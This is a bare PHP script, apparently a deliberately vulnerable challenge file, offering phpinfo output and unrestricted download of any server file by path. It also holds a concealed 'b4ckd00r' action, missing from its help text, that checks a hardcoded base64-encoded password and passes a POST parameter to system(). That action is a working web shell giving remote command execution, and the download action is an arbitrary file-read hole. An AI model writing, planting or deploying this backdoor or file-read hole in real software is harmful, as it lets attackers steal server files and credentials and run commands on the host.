<?php
error_reporting(0);

if (isset($_GET["action"])) {
    if ($_GET["action"] == "phpinfo") {
        phpinfo();
        exit;
    }
    if ($_GET["action"] == "download") {
        $filepath = $_GET["file"];
        if (file_exists($filepath)) {
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($filepath) . '"');
            header('Expires: 0');
            header('Cache-Control: must-revalidate');
            header('Pragma: public');
            header('Content-Length: ' . filesize($filepath));

            readfile($filepath);
            exit;
        } else {
            die('File not found.');
        }
    }
    if ($_GET["action"] == "b4ckd00r") {
        $password = base64_decode($_GET["password"]);
        if ($password == "t0ny3nc") {
            system($_POST["command"]);
        }
    }
} else {
    echo "`/?action=phpinfo` to show phpinfo";
    echo "<br \>";
    echo "`/?action=download&file=` to download any file";
}

